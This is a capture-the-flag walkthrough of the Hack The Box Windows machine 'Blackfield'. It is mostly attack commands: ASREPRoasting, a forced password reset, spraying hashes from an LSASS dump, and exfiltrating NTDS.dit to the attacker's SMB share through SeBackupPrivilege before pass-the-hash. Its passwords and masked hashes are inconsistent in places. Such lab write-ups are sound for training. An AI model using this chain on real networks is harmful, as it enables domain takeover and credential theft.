---
title: "Blackfield - HackTheBox Walkthrough"
date: 2026-01-09 15:30:00 +1100
categories: [TryHackMe, HTB]
tags: [penetration-testing, active-directory, asreproasting, bloodhound, lsass, sebackupprivilege, windows]
image:
  path: /assets/img/blackfield-header.png
  alt: Blackfield HTB Machine
---

## Machine Info

**Difficulty**: Hard  
**OS**: Windows  
**IP**: 10.129.229.17  
**Domain**: BLACKFIELD.local

---

## Initial Recon

Started with a full port scan to see what services were running:

```bash
nmap -p- --min-rate=1000 -T4 10.129.229.17 -oN nmap_scan.txt
```

Found several interesting ports:
- Port 53 (DNS)
- Port 88 (Kerberos)
- Port 389 (LDAP)
- Port 445 (SMB)
- Port 5985 (WinRM)

This told me I was dealing with a Domain Controller for BLACKFIELD.local.

---

## SMB Enumeration

Checked SMB shares using guest access:

```bash
smbmap -u guest -H 10.129.229.17
```

Found READ access to two shares:
- IPC$ (standard, nothing useful)
- **profiles$** (interesting!)

Connected to profiles$ to see what was inside:

```bash
smbclient -N \\\\10.129.229.17\\profiles$
ls
```

The share contained tons of user profile folders. These looked like domain usernames, so I saved them all to a file:

```bash
smbclient -N \\\\10.129.229.17\\profiles$ -c ls | awk '{ print $1 }' > users.txt
```

---

## ASREPRoasting Attack

With a list of potential usernames, I checked if any accounts had Kerberos pre-authentication disabled. This lets us grab password hashes without needing credentials first.

```bash
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.129.229.17
```

Got a hit! The **support** user returned a hash:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:b8b21de8cbb2ae7c9457e6466f2ef...
```

Saved this to a file called `hash.txt` and cracked it with John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password found**: `xxxxBlackKnight`

---

## BloodHound Enumeration

Now that I had valid credentials, I used BloodHound to map out the Active Directory environment:

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c DcOnly
```

Started BloodHound and uploaded the JSON files:

```bash
sudo neo4j start
bloodhound
```

In BloodHound, I marked the support user as owned and searched for "First Degree Object Control". 

Found something useful: **support has ForceChangePassword permission on audit2020!**

---

## Password Reset Attack

Used rpcclient to change audit2020's password:

```bash
rpcclient -U blackfield/support 10.129.229.17
# Password: xxxxBlackKnight

setuserinfo2 audit2020 23 'NewPassword123!'
exit
```

Checked what shares audit2020 could access:

```bash
smbmap -u audit2020 -p 'NewPassword123!' -H 10.129.229.17
```

Now I had READ access to the **forensic** share!

---

## LSASS Memory Dump Analysis

Connected to the forensic share and found a memory dump:

```bash
smbclient //10.129.229.17/forensic -U audit2020
# Password: NewPassword123!

cd memory_analysis
get lsass.zip
exit
```

Extracted and analyzed the LSASS dump using Pypykatz:

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

The output showed multiple users and their NT hashes. I extracted just the important parts:

```bash
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users.txt
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes.txt
```

Sprayed these credentials against the target:

```bash
crackmapexec smb 10.129.229.17 -u users.txt -H hashes.txt
```

Found working credentials:
- **Username**: svc_backup
- **Hash**: 965xd1x1dcd9x501x5e2x05dxf48x00d

---

## Getting a Shell

Connected using evil-winrm with the hash:

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 965xd1dxdcdx250x15ex205x9f48400d
```

Checked my privileges:

```powershell
whoami /priv
```

Found two golden privileges:
- **SeBackupPrivilege** - Enabled
- **SeRestorePrivilege** - Enabled

These privileges let me backup and restore ANY file on the system, including the Active Directory database.

---

## Privilege Escalation via SeBackupPrivilege

First, I tried reading Administrator's files directly, but root.txt was encrypted. So I needed to dump the AD database to get the Administrator's hash.

### Setting up SMB Share

On my Kali machine, I configured a Samba share:

```bash
sudo nano /etc/samba/smb.conf
```

Added this configuration:

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445

[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser
```

Created the SMB user:

```bash
sudo adduser smbuser
sudo smbpasswd -a smbuser
# Password: smbpass
sudo service smbd restart
```

### Backing up NTDS.dit

From my evil-winrm session, I mounted the share:

```powershell
net use k: \\10.10.15.166\smb /user:smbuser smbpass
```

Used Windows Backup to backup the AD database:

```powershell
echo "Y" | wbadmin start backup -backuptarget:\\10.10.15.166\smb -include:c:\windows\ntds
```

Got the backup version:

```powershell
wbadmin get versions
```

Recovered the ntds.dit file:

```powershell
echo "Y" | wbadmin start recovery -version:01/10/2026-15:21 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Exported the SYSTEM hive:

```powershell
reg save HKLM\SYSTEM C:\system.hive
```

Copied both files to my Kali machine:

```powershell
cp C:\ntds.dit k:\ntds.dit
cp C:\system.hive k:\system.hive
```

---

## Extracting Domain Admin Hash

On my Kali machine, I dumped all the hashes:

```bash
cd /tmp/
sudo impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

Found the Administrator hash:

```
Administrator:500:aax3b4x5b5x404xeaax3b43xb51x04ex:18xfb5x517x480xe64x24d4cd53b99ee:::
```

---

## Getting Root

Used wmiexec to get an Administrator shell:

```bash
impacket-wmiexec -hashes :1x4fbxe51x848xbe6x824x4cdx3b99ee administrator@10.129.229.17
```

Grabbed the flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Rooted!** 🚩

---

## Key Takeaways

This machine taught me several important Windows AD attack techniques:

1. **ASREPRoasting** - Always check for users with Kerberos pre-auth disabled when you have a username list
2. **BloodHound** - Essential for finding hidden attack paths in Active Directory
3. **LSASS Analysis** - Memory dumps can contain credentials from recently logged-in users
4. **SeBackupPrivilege Abuse** - Backup Operators group membership is almost as good as Domain Admin

The privilege escalation path using SeBackupPrivilege to dump NTDS.dit was particularly interesting. It showed how even seemingly limited privileges can lead to complete domain compromise if abused correctly.

---

## Tools Used

- nmap
- smbmap / smbclient
- GetNPUsers.py (Impacket)
- John the Ripper
- BloodHound
- rpcclient
- Pypykatz
- CrackMapExec
- evil-winrm
- wbadmin
- secretsdump.py (Impacket)
- wmiexec.py (Impacket)

---

*Happy Hacking! 🎯*
